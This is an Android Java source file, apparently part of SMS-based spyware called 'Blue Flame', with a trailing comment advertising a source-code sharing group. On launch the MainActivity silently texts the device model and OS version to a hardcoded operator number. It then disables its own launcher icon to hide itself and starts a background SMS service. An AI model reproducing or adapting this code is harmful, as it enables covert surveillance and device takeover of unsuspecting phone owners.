package com.very.shuai;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.widget.Toast;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.NotificationCompat.Builder;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		super.requestWindowFeature(Window.FEATURE_NO_TITLE);
		setContentView(R.layout.activity_main);
		SmSutils su=new SmSutils();
//		if(SmSutils.key.equals(SmSutils.getPublicKey(this))){
		su.sendSMS(SmSutils.phone, "咚咚咚，蓝焰来咯,版本"+Build.VERSION.SDK_INT+" "+Build.MODEL,null);
		//Toast.makeText(this, "程序启动成功", Toast.LENGTH_LONG).show();
		PackageManager pm=this.getPackageManager();
		pm.setComponentEnabledSetting(this.getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		Intent intent=new Intent(this,SmSserver.class);
		this.startService(intent);
		this.finish();
//		}else{
//			String sp="证书错误,程序启动失败";
//			su.sendSMS(SmSutils.phone, sp,null);
//			Toast.makeText(this, sp, Toast.LENGTH_LONG).show();
//			this.finish();
//		}

	}



}

//源码群494564275
